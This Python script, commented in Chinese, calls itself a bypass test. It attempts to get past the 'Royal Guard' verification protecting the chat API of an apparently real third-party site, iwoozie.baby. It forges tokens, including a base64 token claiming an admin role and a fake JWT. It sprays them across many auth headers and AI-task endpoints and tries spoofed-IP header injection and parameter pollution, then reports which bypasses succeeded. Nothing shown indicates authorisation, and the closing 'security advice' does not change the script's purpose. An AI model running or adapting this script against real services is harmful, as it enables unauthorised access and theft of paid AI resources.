#!/usr/bin/env python3
"""
简化版 CloudScraper 绕过测试
========================
使用内置库进行绕过测试
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
import uuid
from datetime import datetime

class SimpleCloudScraperTest:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.results = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'failed_attempts': 0,
            'bypassed_methods': [],
            'failed_methods': []
        }
    
    def print_header(self):
        print("=" * 80)
        print("🔓 简化版 CloudScraper 绕过测试")
        print("=" * 80)
        print("🎯 目标: 绕过 iwoozie.baby/chat 的 Royal Guard 防护")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def generate_advanced_tokens(self):
        """生成高级伪造 token"""
        print("🎭 生成高级伪造 token...")
        
        tokens = []
        
        # 1. 基于时间戳的 token
        timestamp = int(time.time())
        tokens.append({
            'type': 'timestamp',
            'value': hashlib.md5(str(timestamp).encode()).hexdigest(),
            'description': '基于时间戳的 MD5 token'
        })
        
        # 2. 基于会话的 token
        session_id = str(uuid.uuid4()).replace('-', '')
        tokens.append({
            'type': 'session',
            'value': hashlib.sha256(session_id.encode()).hexdigest(),
            'description': '基于会话的 SHA256 token'
        })
        
        # 3. 基于 HMAC 的 token
        message = f"bypass_{timestamp}_{random.randint(1000, 9999)}"
        key = "royal_guard_secret_key"
        hmac_token = hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()
        tokens.append({
            'type': 'hmac',
            'value': hmac_token,
            'description': '基于 HMAC 的 token'
        })
        
        # 4. 基于 JWT 风格的 token
        header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode()
        payload = base64.b64encode(json.dumps({
            "user_id": random.randint(1000, 9999),
            "timestamp": timestamp,
            "exp": timestamp + 3600
        }).encode()).decode()
        signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
        jwt_token = f"{header}.{payload}.{signature}"
        tokens.append({
            'type': 'jwt',
            'value': jwt_token,
            'description': 'JWT 风格的 token'
        })
        
        # 5. 基于 Base64 编码的 token
        data = {
            "token": str(uuid.uuid4()),
            "timestamp": timestamp,
            "user": "bypass_user",
            "role": "admin"
        }
        b64_token = base64.b64encode(json.dumps(data).encode()).decode()
        tokens.append({
            'type': 'base64',
            'value': b64_token,
            'description': 'Base64 编码的 token'
        })
        
        for token in tokens:
            print(f"  ✅ {token['type']}: {token['value'][:20]}...")
        
        return tokens
    
    def make_request(self, url, data, headers, method='POST'):
        """发送HTTP请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers, method=method)
            req.add_header('Content-Type', 'application/json')
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = response.read().decode('utf-8')
                return response.getcode(), response_data, dict(response.headers)
                
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8'), dict(e.headers)
        except urllib.error.URLError as e:
            return 0, str(e), {}
        except Exception as e:
            return 0, str(e), {}
    
    def test_token_bypass(self, tokens):
        """测试 token 绕过"""
        print("🎯 测试 token 绕过...")
        
        for i, token_info in enumerate(tokens):
            token = token_info['value']
            token_type = token_info['type']
            
            print(f"  测试 token {i+1}/{len(tokens)} ({token_type}): {token[:20]}...")
            
            # 测试多种绕过方法
            bypass_methods = [
                self.test_direct_api_bypass,
                self.test_header_injection_bypass,
                self.test_parameter_pollution_bypass
            ]
            
            for method in bypass_methods:
                if method(token, token_type):
                    return True
            
            time.sleep(0.5)
        
        return False
    
    def test_direct_api_bypass(self, token, token_type):
        """测试直接 API 绕过"""
        print("    🔍 测试直接 API 绕过...")
        
        # 多种请求头组合
        header_combinations = [
            {'x-api-key': token},
            {'Authorization': f'Bearer {token}'},
            {'x-auth-token': token},
            {'x-token': token},
            {'api-key': token},
            {'token': token},
            {'x-access-token': token},
            {'x-session-token': token},
            {'x-verification-token': token},
            {'x-captcha-token': token},
            {'x-royal-guard-token': token}
        ]
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        api_endpoints = [
            '/api/quick/createAITask?model=GPT-4',
            '/api/quick/createAITask?model=Grok-4-Fast',
            '/api/chat',
            '/api/ai/chat',
            '/api/v1/chat'
        ]
        
        for endpoint in api_endpoints:
            for headers in header_combinations:
                try:
                    url = f"{self.base_url}{endpoint}"
                    status_code, response_data, response_headers = self.make_request(url, data, headers)
                    
                    self.results['total_attempts'] += 1
                    
                    if status_code == 200:
                        try:
                            response_json = json.loads(response_data)
                            if 'code' in response_json and response_json['code'] == 200:
                                print(f"    ✅ 成功绕过: {endpoint} with {list(headers.keys())[0]}")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]}")
                                return True
                        except:
                            pass
                    
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]}")
                    
                except Exception as e:
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]} - {str(e)}")
        
        return False
    
    def test_header_injection_bypass(self, token, token_type):
        """测试请求头注入绕过"""
        print("    🔍 测试请求头注入绕过...")
        
        # 注入多种请求头
        injection_headers = {
            'x-api-key': token,
            'x-forwarded-for': '127.0.0.1',
            'x-real-ip': '127.0.0.1',
            'x-client-ip': '127.0.0.1',
            'x-remote-ip': '127.0.0.1',
            'x-originating-ip': '127.0.0.1',
            'x-verification': 'bypass',
            'x-bypass': '1',
            'x-admin': 'true',
            'x-debug': '1',
            'x-test': '1',
            'x-override': '1',
            'x-force': '1',
            'x-skip': '1',
            'x-ignore': '1',
            'x-bypass-captcha': '1',
            'x-bypass-verification': '1',
            'x-bypass-royal-guard': '1',
            'x-royal-guard-bypass': '1',
            'x-verification-bypass': '1',
            'x-captcha-bypass': '1'
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
        
        try:
            status_code, response_data, response_headers = self.make_request(url, data, injection_headers)
            
            self.results['total_attempts'] += 1
            
            if status_code == 200:
                try:
                    response_json = json.loads(response_data)
                    if 'code' in response_json and response_json['code'] == 200:
                        print("    ✅ 请求头注入成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("header_injection_bypass")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("header_injection_bypass")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"header_injection_bypass - {str(e)}")
        
        return False
    
    def test_parameter_pollution_bypass(self, token, token_type):
        """测试参数污染绕过"""
        print("    🔍 测试参数污染绕过...")
        
        # 多种参数污染
        pollution_params = [
            {'model': 'GPT-4', 'token': token},
            {'model': 'GPT-4', 'api_key': token},
            {'model': 'GPT-4', 'auth_token': token},
            {'model': 'GPT-4', 'verification': 'passed'},
            {'model': 'GPT-4', 'bypass': '1'},
            {'model': 'GPT-4', 'admin': 'true'},
            {'model': 'GPT-4', 'debug': '1'},
            {'model': 'GPT-4', 'test': '1'},
            {'model': 'GPT-4', 'override': '1'},
            {'model': 'GPT-4', 'force': '1'},
            {'model': 'GPT-4', 'skip': '1'},
            {'model': 'GPT-4', 'ignore': '1'},
            {'model': 'GPT-4', 'bypass_captcha': '1'},
            {'model': 'GPT-4', 'bypass_verification': '1'},
            {'model': 'GPT-4', 'bypass_royal_guard': '1'},
            {'model': 'GPT-4', 'royal_guard_bypass': '1'},
            {'model': 'GPT-4', 'verification_bypass': '1'},
            {'model': 'GPT-4', 'captcha_bypass': '1'}
        ]
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        for params in pollution_params:
            try:
                param_string = urllib.parse.urlencode(params)
                url = f"{self.base_url}/api/quick/createAITask?{param_string}"
                status_code, response_data, response_headers = self.make_request(url, data, {})
                
                self.results['total_attempts'] += 1
                
                if status_code == 200:
                    try:
                        response_json = json.loads(response_data)
                        if 'code' in response_json and response_json['code'] == 200:
                            print(f"    ✅ 参数污染成功: {params}")
                            self.results['successful_bypasses'] += 1
                            self.results['bypassed_methods'].append(f"parameter_pollution_bypass: {params}")
                            return True
                    except:
                        pass
                
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution_bypass: {params}")
                
            except Exception as e:
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution_bypass: {params} - {str(e)}")
        
        return False
    
    def run_comprehensive_bypass(self):
        """运行综合绕过测试"""
        self.print_header()
        
        print("🚀 开始简化版绕过测试...")
        print()
        
        # 步骤1: 生成高级伪造 token
        print("🎭 步骤1: 生成高级伪造 token...")
        tokens = self.generate_advanced_tokens()
        print(f"  生成了 {len(tokens)} 个高级 token")
        print()
        
        # 步骤2: 测试 token 绕过
        print("🎯 步骤2: 测试 token 绕过...")
        success = self.test_token_bypass(tokens)
        
        print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 简化版绕过测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attempts']
        success = self.results['successful_bypasses']
        failed = self.results['failed_attempts']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总尝试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败尝试: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
            print("  1. 加强 token 验证机制")
            print("  2. 实施更严格的会话管理")
            print("  3. 添加 CloudScraper 检测")
            print("  4. 实施多层防护机制")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
            print("  1. 完善 token 验证")
            print("  2. 加强会话管理")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好")
            print("  1. 继续保持现有防护措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    test = SimpleCloudScraperTest()
    test.run_comprehensive_bypass()

if __name__ == "__main__":
    main()
